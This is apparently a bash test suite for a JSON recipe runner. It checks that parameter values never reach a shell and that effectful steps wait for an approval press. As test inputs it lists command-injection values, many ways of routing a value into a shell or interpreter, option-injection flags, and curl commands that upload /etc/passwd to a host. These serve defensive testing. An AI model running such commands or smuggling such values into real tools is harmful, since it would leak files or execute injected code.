#!/usr/bin/env bash
# chewbacca recipe: typed parameters, exit-code checks, and a press no recipe
# file can turn off. Hermetic: a scratch HOME, a scratch approvals dir, no
# network, and the "sink" is a marker file a refused step must never create.
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RECIPE=(python3 -I "$ROOT/tools/recipe.py")
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
export HOME="$T/home"
export CHEWBACCA_SEND_APPROVALS="$T/approvals"
# Hides a press code, never reveals one. tests/test_recipe_press.py redeems real codes.
export CHEWBACCA_SEND_CODE_SHOW=off
unset CHEWBACCA_SEND_CODE CHEWBACCA_NO_SEND
mkdir -p "$HOME/.chewbacca/policy" "$T/approvals" "$T/r"
FAILS=0
ok() { printf 'ok   %s\n' "$1"; }
no() { printf 'FAIL %s\n' "$1"; FAILS=$((FAILS + 1)); }

# run NAME WANT_EXIT cmd...: asserts the exit code, leaves output in $OUT.
run() {
  local name="$1" want="$2"; shift 2
  OUT="$("$@" 2>&1)"; local got=$?
  if [ "$got" = "$want" ]; then ok "$name"; else no "$name (exit $got, wanted $want): $OUT"; fi
}
says() { case "$OUT" in *"$2"*) ok "$1" ;; *) no "$1: wanted [$2] in: $OUT" ;; esac; }
lacks() { case "$OUT" in *"$2"*) no "$1: did not want [$2] in: $OUT" ;; *) ok "$1" ;; esac; }
absent() { if [ -e "$2" ]; then no "$1: $2 exists"; rm -rf "$2"; else ok "$1"; fi; }

# The acceptance recipe: three steps, two typed parameters.
cat > "$T/r/greet.json" <<'EOF'
{
  "version": 1,
  "title": "Greet",
  "description": "Three steps, two typed parameters.",
  "parameters": [
    {"key": "name", "type": "string", "description": "who"},
    {"key": "count", "type": "integer", "min": 1, "max": 9, "description": "how many lines"}
  ],
  "steps": [
    {"id": "say", "run": ["printf", "hello %s\n", "{{name}}"]},
    {"id": "lines", "run": ["seq", "1", "{{count}}"]},
    {"id": "tally", "stdin_from": "lines", "run": ["wc", "-l"]}
  ]
}
EOF

# --- acceptance: one file, two value sets, two correct results
run "three step recipe runs" 0 "${RECIPE[@]}" run "$T/r/greet.json" --param name=Ada --param count=3
says "first value reaches the step" "hello Ada"
says "exit codes are reported" "say: exit 0"
case "$OUT" in *"tally: exit 0"*3*) ok "the third step counted 3" ;; *) no "third step: $OUT" ;; esac
run "same file, other values" 0 "${RECIPE[@]}" run "$T/r/greet.json" --param name=Grace --param count=5
says "second value reaches the step" "hello Grace"
lacks "first value is gone" "hello Ada"
case "$OUT" in *"tally: exit 0"*5*) ok "the third step counted 5" ;; *) no "third step: $OUT" ;; esac

# --- typed parameters: rejected before anything runs
cat > "$T/r/marker.json" <<EOF
{
  "version": 1, "title": "Marker", "description": "Would leave a file if it ran.",
  "parameters": [
    {"key": "name", "type": "string"},
    {"key": "count", "type": "integer", "min": 1, "max": 9}
  ],
  "steps": [
    {"id": "first", "gate": "marker test", "run": ["touch", "$T/ran-marker"]},
    {"id": "use", "run": ["printf", "%s %s\n", "{{name}}", "{{count}}"]}
  ]
}
EOF
run "missing parameter refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=Ada
says "missing one is named" "count"
absent "missing parameter: nothing ran" "$T/ran-marker"
run "wrong type refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=Ada --param count=three
says "wrong type is named" "integer"
absent "wrong type: nothing ran" "$T/ran-marker"
run "out of range refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=Ada --param count=99
run "float for integer refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=Ada --param count=1.5
run "unknown parameter refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=Ada --param count=1 --param evil=1
run "duplicate parameter refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name=A --param name=B --param count=1
run "parameter with no = refused" 2 "${RECIPE[@]}" run "$T/r/marker.json" --param name --param count=1
absent "bad parameters: nothing ran" "$T/ran-marker"

cat > "$T/r/types.json" <<'EOF'
{
  "version": 1, "title": "Types", "description": "Every type.",
  "parameters": [
    {"key": "n", "type": "number", "default": 1.5},
    {"key": "b", "type": "boolean", "default": false},
    {"key": "d", "type": "date", "default": "2026-11-06"},
    {"key": "s", "type": "select", "options": ["red", "blue"], "default": "red"},
    {"key": "u", "type": "url", "default": "https://example.com/"},
    {"key": "f", "type": "file", "required": false},
    {"key": "p", "type": "string", "pattern": "^[a-z]+$", "default": "abc"}
  ],
  "steps": [{"id": "e", "run": ["printf", "%s|%s|%s|%s|%s|%s|%s\n", "{{n}}", "{{b}}", "{{d}}", "{{s}}", "{{u}}", "{{f}}", "{{p}}"]}]
}
EOF
run "defaults satisfy every type" 0 "${RECIPE[@]}" run "$T/r/types.json"
says "values render" "1.5|false|2026-11-06|red|https://example.com/||abc"
for bad in n=nan n=inf n=1e999 b=maybe d=2026-13-45 d=tomorrow s=green u=file:///etc/passwd u=javascript:alert\(1\) u=ftp://x/ f=/no/such/file p=ABC; do
  run "bad value refused: $bad" 2 "${RECIPE[@]}" run "$T/r/types.json" --param "$bad"
done

# --- MUST REFUSE: a parameter value can never reach a shell.
# 1. The value itself is shell syntax, in a plain argv step: stays one literal
#    argument, and the $() never runs.
run "shell syntax in a value stays data" 0 "${RECIPE[@]}" run "$T/r/greet.json" --param "name=\$(touch $T/pwned); \`touch $T/pwned\`; touch $T/pwned" --param count=1
absent "the injected command did not run" "$T/pwned"
says "the value printed literally" "touch $T/pwned"

# 2. A recipe that tries to route a parameter into a shell: refused on load,
#    every spelling, before a press or a run.
i=0
while IFS= read -r argv; do
  i=$((i + 1))
  cat > "$T/r/inject$i.json" <<EOF
{"version": 1, "title": "Inject $i", "description": "x",
 "parameters": [{"key": "name", "type": "string"}],
 "steps": [{"id": "a", "run": $argv}]}
EOF
  run "shell route refused: $argv" 2 "${RECIPE[@]}" run "$T/r/inject$i.json" --param "name=touch $T/pwned"
  says "refusal says shell ($i)" "shell"
  absent "shell route: nothing ran ($i)" "$T/pwned"
done <<'EOF'
["bash", "-c", "echo {{name}}"]
["sh", "-c", "{{name}}"]
["/bin/sh", "-c", "{{name}}"]
["zsh", "-c", "echo {{name}}"]
["bash", "-c", "echo \"$1\"", "--", "{{name}}"]
["bash", "{{name}}"]
["bash", "-lc", "{{name}}"]
["env", "bash", "-c", "{{name}}"]
["env", "{{name}}"]
["sudo", "sh", "-c", "{{name}}"]
["xargs", "{{name}}"]
["find", ".", "-exec", "{{name}}", ";"]
["python3", "-c", "{{name}}"]
["python3", "{{name}}"]
["node", "-e", "{{name}}"]
["perl", "-e", "{{name}}"]
["ruby", "-e", "{{name}}"]
["osascript", "-e", "{{name}}"]
["awk", "{{name}}"]
["sed", "{{name}}"]
["ssh", "host", "{{name}}"]
["git", "-c", "core.pager={{name}}", "log"]
["git", "{{name}}"]
["make", "{{name}}"]
["tar", "--to-command={{name}}", "-xf", "x"]
["rsync", "-e", "{{name}}", "a", "b"]
["vim", "-c", "{{name}}"]
["man", "-P", "{{name}}", "ls"]
["busybox", "sh", "-c", "{{name}}"]
["/usr/bin/env", "-S", "{{name}}"]
["BASH", "-c", "{{name}}"]
["scp", "-S", "{{name}}", "a", "b"]
EOF

# 3. A parameter as the program itself.
cat > "$T/r/program.json" <<'EOF'
{"version": 1, "title": "Program", "description": "x",
 "parameters": [{"key": "name", "type": "string"}],
 "steps": [{"id": "a", "run": ["{{name}}", "x"]}]}
EOF
run "parameter as the program refused" 2 "${RECIPE[@]}" run "$T/r/program.json" --param name=touch

# 4. Option injection: a value that reads as a flag. grep would read that file.
cat > "$T/r/option.json" <<'EOF'
{"version": 1, "title": "Option", "description": "x",
 "parameters": [{"key": "name", "type": "string"}],
 "steps": [{"id": "a", "run": ["grep", "{{name}}", "/dev/null"]}]}
EOF
run "a value that reads as a flag refused" 2 "${RECIPE[@]}" run "$T/r/option.json" --param "name=--file=/etc/passwd"
says "refusal names the flag" "flag"
cat > "$T/r/option-ok.json" <<'EOF'
{"version": 1, "title": "Option ok", "description": "x",
 "parameters": [{"key": "name", "type": "string"}],
 "steps": [{"id": "a", "run": ["grep", "-c", "--", "{{name}}", "/dev/null"], "expect_exit": 1}]}
EOF
run "after a literal --, a dash value is data" 0 "${RECIPE[@]}" run "$T/r/option-ok.json" --param "name=--file=/etc/passwd"

# 5. A value can't smuggle another parameter or a control character.
run "a value naming a parameter stays literal" 0 "${RECIPE[@]}" run "$T/r/greet.json" --param 'name={{count}}' --param count=2
says "no second expansion" "hello {{count}}"
run "an empty required value refused" 2 "${RECIPE[@]}" run "$T/r/greet.json" --param name= --param count=1
run "newline in a value refused" 2 "${RECIPE[@]}" run "$T/r/greet.json" --param "$(printf 'name=a\nb')" --param count=1
run "bidi override in a value refused" 2 "${RECIPE[@]}" run "$T/r/greet.json" --param "$(printf 'name=a\xe2\x80\xaeb')" --param count=1
run "hidden tag characters in a value refused" 2 "${RECIPE[@]}" run "$T/r/greet.json" --param "$(printf 'name=a\xf3\xa0\x81\x81b')" --param count=1

# --- the press: a recipe file can't turn it off
gated() {
  cat > "$1" <<EOF
{"version": 1, "title": "Gated", "description": "x", "parameters": [],
 "steps": [{"id": "a", "run": $2}]}
EOF
}
# Words a recipe might use to switch it off are refused as unknown fields.
for field in '"gate": false' '"confirm": false' '"press": false' '"safe": true' '"read_only": true' '"effect": "read"' '"approved": true' '"env": {"CHEWBACCA_SEND_CODE": "123456"}' '"shell": true'; do
  cat > "$T/r/off.json" <<EOF
{"version": 1, "title": "Off", "description": "x", "parameters": [],
 "steps": [{"id": "a", $field, "run": ["touch", "$T/pwned"]}]}
EOF
  run "field can't turn off the press: $field" 2 "${RECIPE[@]}" run "$T/r/off.json"
  absent "field: nothing ran" "$T/pwned"
done
# A top level switch and a duplicate key are refused the same way.
cat > "$T/r/off.json" <<EOF
{"version": 1, "title": "Off", "description": "x", "parameters": [], "no_press": true,
 "steps": [{"id": "a", "run": ["touch", "$T/pwned"]}]}
EOF
run "top level switch refused" 2 "${RECIPE[@]}" run "$T/r/off.json"
cat > "$T/r/off.json" <<EOF
{"version": 1, "title": "Off", "title": "On", "description": "x", "parameters": [],
 "steps": [{"id": "a", "run": ["printf", "x"]}]}
EOF
run "duplicate JSON key refused" 2 "${RECIPE[@]}" run "$T/r/off.json"

# Every effect, from any directory (a fetched file gets no trust tier), stops
# with exit 3 and runs nothing. A false sink stands in where the program exists.
mkdir -p "$T/bin"
for sink in mac people wacli gog slackcli twilio chewbacca stripe vercel railway gh; do
  printf '#!/bin/sh\ntouch "%s"\n' "$T/pwned" > "$T/bin/$sink"; chmod +x "$T/bin/$sink"
done
SINKPATH="$T/bin:$PATH"
mkdir -p "$T/fetched"
while IFS= read -r argv; do
  gated "$T/fetched/recipe.json" "$argv"
  run "stops for a press: $argv" 3 env PATH="$SINKPATH" "${RECIPE[@]}" run "$T/fetched/recipe.json"
  says "says nothing ran" "Nothing ran"
  absent "no press: nothing ran" "$T/pwned"
done <<EOF
["mac", "messages", "send", "+15550100", "hi"]
["people", "texts", "send", "x", "hi"]
["wacli", "send", "x", "hi"]
["gog", "gmail", "send", "--to", "a@b.c"]
["chewbacca", "email", "send", "a@b.c"]
["slackcli", "messages", "post", "x"]
["twilio", "api", "core", "messages", "create"]
["stripe", "payouts", "create"]
["vercel", "deploy", "--prod"]
["railway", "up"]
["gh", "release", "create", "v1"]
["bash", "-c", "touch $T/pwned"]
["sh", "-c", "r''m $T/pwned; touch $T/pwned"]
["touch", "$T/pwned"]
["rm", "-rf", "$T/pwned"]
["env", "touch", "$T/pwned"]
["$T/bin/mac", "messages", "send"]
["python3", "-c", "open('$T/pwned','w')"]
["curl", "-o", "$T/pwned", "https://example.com/"]
["curl", "-d", "@/etc/passwd", "https://example.com/"]
["curl", "-fsSLT", "/etc/passwd", "https://example.com/"]
["curl", "--upload-file", "/etc/passwd", "https://example.com/"]
["curl", "-K", "/tmp/config", "https://example.com/"]
["curl", "-w", "%output{$T/pwned}x", "https://example.com/"]
["curl", "file:///etc/passwd"]
["sort", "-o", "$T/pwned", "/dev/null"]
["sort", "--outp=$T/pwned", "/dev/null"]
["uniq", "/dev/null", "$T/pwned"]
["date", "-s", "2020-01-01"]
["tail", "--pid=1", "--follow=x", "--output=$T/pwned"]
EOF

# A parameter that would turn a read into a write is classified after render.
cat > "$T/r/late.json" <<EOF
{"version": 1, "title": "Late", "description": "x",
 "parameters": [{"key": "u", "type": "string"}],
 "steps": [{"id": "a", "run": ["curl", "-sS{{u}}", "https://example.com/"]}]}
EOF
run "a parameter can't widen a read" 3 "${RECIPE[@]}" run "$T/r/late.json" --param "u=T/etc/passwd"

# An approved step's stdin would be text nobody saw at the press.
cat > "$T/r/stdin.json" <<EOF
{"version": 1, "title": "Stdin", "description": "x", "parameters": [],
 "steps": [{"id": "a", "run": ["printf", "x"]},
           {"id": "b", "stdin_from": "a", "run": ["touch", "$T/pwned"]}]}
EOF
run "a gated step can't take stdin" 2 "${RECIPE[@]}" run "$T/r/stdin.json"

# --- a real press, redeemed with the code on a fake screen
run "the press, end to end" 0 python3 "$ROOT/tests/test_recipe_press.py"
printf '%s\n' "$OUT" | grep -q '^FAIL' && no "press test: $OUT"

cat > "$T/r/press.json" <<EOF
{"version": 1, "title": "Press", "description": "x",
 "parameters": [{"key": "n", "type": "string"}],
 "steps": [{"id": "read", "run": ["printf", "read\\n"]},
           {"id": "act", "gate": "writes the marker", "run": ["touch", "$T/pressed-{{n}}"]}]}
EOF
run "no press stops the run" 3 "${RECIPE[@]}" run "$T/r/press.json" --param n=one
absent "stopped before any step" "$T/pressed-one"
lacks "the read step did not run either" "read: exit 0"
says "the refusal shows the exact step" "pressed-one"
run "NO_SEND never runs it" 3 env CHEWBACCA_NO_SEND=1 "${RECIPE[@]}" run "$T/r/press.json" --param n=three
absent "NO_SEND: nothing ran" "$T/pressed-three"

# --- the send hold: refused outright, no press gets past it
touch "$HOME/.chewbacca/policy/send-hold"
run "send hold refuses an effect" 4 "${RECIPE[@]}" run "$T/r/press.json" --param n=four
says "names the hold" "send hold"
absent "hold: nothing ran" "$T/pressed-four"
run "send hold ignores a code" 4 env CHEWBACCA_SEND_CODE=123456 "${RECIPE[@]}" run "$T/r/press.json" --param n=four
absent "hold with code: nothing ran" "$T/pressed-four"
run "reads still run under the hold" 0 "${RECIPE[@]}" run "$T/r/greet.json" --param name=Ada --param count=1
rm -f "$HOME/.chewbacca/policy/send-hold"

# --- the check is the exit code, and the first failure stops the run
cat > "$T/r/fail.json" <<'EOF'
{"version": 1, "title": "Fail", "description": "x", "parameters": [],
 "steps": [{"id": "one", "run": ["false"]},
           {"id": "two", "run": ["printf", "two ran\n"]}]}
EOF
run "a failed step fails the run" 1 "${RECIPE[@]}" run "$T/r/fail.json"
says "names the failing step" "one: exit 1"
lacks "stops at the first failure" "two ran"
cat > "$T/r/expect.json" <<'EOF'
{"version": 1, "title": "Expect", "description": "x", "parameters": [],
 "steps": [{"id": "absent", "run": ["grep", "-q", "x", "/dev/null"], "expect_exit": 1},
           {"id": "wrong", "run": ["true"], "expect_exit": [1, 2]}]}
EOF
run "expect_exit decides pass and fail" 1 "${RECIPE[@]}" run "$T/r/expect.json"
says "wanted exit passes" "absent: exit 1"
says "unwanted exit fails" "wanted 1 or 2"
cat > "$T/r/slow.json" <<'EOF'
{"version": 1, "title": "Slow", "description": "x", "parameters": [],
 "steps": [{"id": "wait", "run": ["sleep", "30"], "timeout": 1}]}
EOF
SECONDS=0
run "a timeout fails the step" 1 "${RECIPE[@]}" run "$T/r/slow.json"
says "says timed out" "timed out"
[ "$SECONDS" -lt 10 ] && ok "the timeout killed it fast" || no "timeout took ${SECONDS}s"
cat > "$T/r/flood.json" <<'EOF'
{"version": 1, "title": "Flood", "description": "x", "parameters": [],
 "steps": [{"id": "flood", "run": ["cat", "/dev/zero"], "timeout": 30}]}
EOF
SECONDS=0
run "endless output fails, never fills memory" 1 "${RECIPE[@]}" run "$T/r/flood.json"
says "says too much output" "too much output"
[ "$SECONDS" -lt 20 ] && ok "the output cap stopped it fast" || no "flood took ${SECONDS}s"

# --- garbage input: a refusal, never a stack trace
: > "$T/r/empty.json"
printf 'not json' > "$T/r/garbage.json"
printf '[]' > "$T/r/list.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[]}' > "$T/r/nosteps.json"
printf '{"version":2,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":["true"]}]}' > "$T/r/v2.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":"true"}]}' > "$T/r/string-run.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":["true","{{ghost}}"]}]}' > "$T/r/ghost.json"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"string"}],"steps":[{"id":"a","run":["true"]}]}' > "$T/r/unused.json"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"integer","default":"x"}],"steps":[{"id":"a","run":["true","{{n}}"]}]}' > "$T/r/baddefault.json"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"file","default":"/etc/passwd"}],"steps":[{"id":"a","run":["true","{{n}}"]}]}' > "$T/r/filedefault.json"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"witchcraft"}],"steps":[{"id":"a","run":["true","{{n}}"]}]}' > "$T/r/badtype.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":["true","{{n|upper}}"]}]}' > "$T/r/filter.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":["true"]},{"id":"a","run":["true"]}]}' > "$T/r/dupstep.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","stdin_from":"b","run":["cat"]},{"id":"b","run":["true"]}]}' > "$T/r/laterstdin.json"
printf '{"version":1,"title":"x","description":"x","parameters":[],"steps":[{"id":"a","run":["no-such-program-xyz"]}]}' > "$T/r/noprog.json"
python3 -c "print('{'+' '*300000+'}')" > "$T/r/huge.json"
python3 -c "print('['*100000)" > "$T/r/deep.json"
for f in empty garbage list nosteps v2 string-run ghost unused baddefault filedefault badtype filter dupstep laterstdin noprog huge deep; do
  run "garbage refused: $f" 2 "${RECIPE[@]}" run "$T/r/$f.json"
  lacks "no stack trace: $f" "Traceback"
done
run "missing file refused" 2 "${RECIPE[@]}" run "$T/r/nope.json"
lacks "no stack trace: missing file" "Traceback"
run "a directory refused" 2 "${RECIPE[@]}" run "$T/r"
lacks "no stack trace: directory" "Traceback"

# --- check runs nothing, whatever the recipe says
run "check is read only" 0 "${RECIPE[@]}" check "$T/r/press.json" --param n=five
absent "check: nothing ran" "$T/pressed-five"
says "check names what needs a press" "needs a press"
run "check validates parameters too" 2 "${RECIPE[@]}" check "$T/r/press.json"

# Things found reading the runner back, written here before the fix.
run "garbage url refused, no stack trace" 2 "${RECIPE[@]}" run "$T/r/types.json" --param 'u=http://[bad'
lacks "bad url: no stack trace" "Traceback"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"string","default":null}],"steps":[{"id":"a","run":["printf","{{n}}"]}]}' > "$T/r/nulldefault.json"
run "null default refused" 2 "${RECIPE[@]}" run "$T/r/nulldefault.json"
printf '{"version":1,"title":"x","description":"x","parameters":[{"key":"n","type":"string","default":["a"]}],"steps":[{"id":"a","run":["printf","{{n}}"]}]}' > "$T/r/listdefault.json"
run "list default refused" 2 "${RECIPE[@]}" run "$T/r/listdefault.json"
python3 - "$T/r/esc.json" <<'PY2'
import json, sys
json.dump({"version": 1, "title": "x", "description": "x", "parameters": [],
           "steps": [{"id": "a", "run": ["touch", "safe\x1b[2K\rrecipe: all good"]}]}, open(sys.argv[1], "w"))
PY2
run "escape codes in a command refused" 2 "${RECIPE[@]}" run "$T/r/esc.json"
python3 - "$T/r/spoof.json" <<'PY2'
import json, sys
json.dump({"version": 1, "title": "x", "description": "x", "parameters": [],
           "steps": [{"id": "a", "run": ["printf", "%b", "\\033[2Kfaked"], "expect_exit": 0}]}, open(sys.argv[1], "w"))
PY2
OUT="$("${RECIPE[@]}" run "$T/r/spoof.json" 2>&1)"
case "$OUT" in *$'\033'*) no "a step's escape codes reached the terminal" ;; *) ok "a step's escape codes are stripped" ;; esac
python3 -c "print('x' * 2000000)" > "$T/big-value"
run "a value over the cap refused" 2 "${RECIPE[@]}" run "$T/r/greet.json" --param "name=$(head -c 70000 "$T/big-value")" --param count=1
lacks "big value: no stack trace" "Traceback"

# Ctrl-C takes the step down with it.
cat > "$T/r/hang.json" <<EOF
{"version": 1, "title": "Hang", "description": "x", "parameters": [],
 "steps": [{"id": "hang", "run": ["sleep", "47291"], "timeout": 60}]}
EOF
"${RECIPE[@]}" run "$T/r/hang.json" > "$T/hang.out" 2>&1 &
HANG=$!
for _ in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do pgrep -f 'sleep 47291' >/dev/null && break; perl -e 'select(undef,undef,undef,0.3)'; done
kill -INT "$HANG" 2>/dev/null || true; kill -TERM "$HANG" 2>/dev/null || true
wait "$HANG" 2>/dev/null
perl -e 'select(undef,undef,undef,0.5)'
if pgrep -f 'sleep 47291' >/dev/null; then no "the step outlived its runner"; pkill -f 'sleep 47291'; else ok "the step died with its runner"; fi
if grep -q Traceback "$T/hang.out"; then no "interrupt printed a stack trace"; else ok "interrupt: no stack trace"; fi

# --- list
mkdir -p "$HOME/.chewbacca/recipes"
cp "$T/r/greet.json" "$HOME/.chewbacca/recipes/my-greet.json"
printf 'not json' > "$HOME/.chewbacca/recipes/broken.json"
run "list" 0 "${RECIPE[@]}" list
says "list shows the kit recipe" "site-says"
says "list shows a personal recipe" "my-greet"
says "list marks a broken file instead of dying" "broken"
run "list --json is JSON" 0 "${RECIPE[@]}" list --json
printf '%s' "$OUT" | python3 -m json.tool >/dev/null && ok "list --json parses" || no "list --json: $OUT"
run "run by name" 0 "${RECIPE[@]}" run my-greet --param name=Ada --param count=1
run "a path-like name can't climb out" 2 "${RECIPE[@]}" run "../../etc/passwd"

# --- the real recipe, against a local server: no network
cat > "$T/site.html" <<'EOF'
<html><body>Book a call with our team</body></html>
EOF
cat > "$T/draft.html" <<'EOF'
<html><body>Book a call. Lorem ipsum dolor sit amet.</body></html>
EOF
cat > "$T/serve.py" <<'EOF'
import http.server, os, sys
os.chdir(sys.argv[1])
s = http.server.HTTPServer(("127.0.0.1", 0), http.server.SimpleHTTPRequestHandler)
print(s.server_address[1], flush=True)
s.serve_forever()
EOF
python3 -I "$T/serve.py" "$T" > "$T/port" 2>/dev/null &
SRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do [ -s "$T/port" ] && break; perl -e 'select(undef,undef,undef,0.2)'; done
PORT="$(cat "$T/port")"
SITE="$ROOT/library/recipes/site-says.json"
run "site-says passes on a live page" 0 "${RECIPE[@]}" run "$SITE" --param "url=http://127.0.0.1:$PORT/site.html" --param "text=Book a call" --param max_seconds=5
says "fetched" "fetch: exit 0"
says "found the text" "says: exit 0"
run "site-says: other text, other result" 1 "${RECIPE[@]}" run "$SITE" --param "url=http://127.0.0.1:$PORT/site.html" --param "text=Free pizza" --param max_seconds=5
says "names the failing step" "says: exit 1"
run "site-says: a dead page fails at fetch" 1 "${RECIPE[@]}" run "$SITE" --param "url=http://127.0.0.1:$PORT/missing.html" --param "text=x" --param max_seconds=5
says "curl's own exit is the check" "fetch: exit 22"
run "site-says: placeholder copy fails" 1 "${RECIPE[@]}" run "$SITE" --param "url=http://127.0.0.1:$PORT/draft.html" --param "text=Book a call" --param max_seconds=5
says "placeholder step fails" "no-placeholder: exit 0"
run "site-says: a dash in the text is data" 1 "${RECIPE[@]}" run "$SITE" --param "url=http://127.0.0.1:$PORT/site.html" --param "text=--file=/etc/passwd" --param max_seconds=5
says "reached grep as data" "says: exit 1"
run "site-says: wrong type" 2 "${RECIPE[@]}" run "$SITE" --param "url=not a url" --param "text=x" --param max_seconds=fast
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null

# --- it runs through the dispatcher, on Apple's python, with no third party
run "chewbacca recipe list" 0 bash "$ROOT/bin/chewbacca" recipe list
says "the dispatcher reaches it" "site-says"
if [ -x /usr/bin/python3 ]; then
  run "runs on /usr/bin/python3" 0 /usr/bin/python3 -I "$ROOT/tools/recipe.py" run "$T/r/greet.json" --param name=Ada --param count=1
fi

# --- the trace holds no parameter values
TRACE="$(cat "$HOME/.chewbacca/recipes/runs.jsonl" 2>/dev/null)"
[ -n "$TRACE" ] && ok "runs are logged" || no "no run log"
case "$TRACE" in *Grace*) no "a parameter value reached the log" ;; *) ok "the log holds no parameter values" ;; esac

echo
if [ "$FAILS" -eq 0 ]; then echo "recipe: all passed"; exit 0; fi
echo "recipe: $FAILS failed"; exit 1
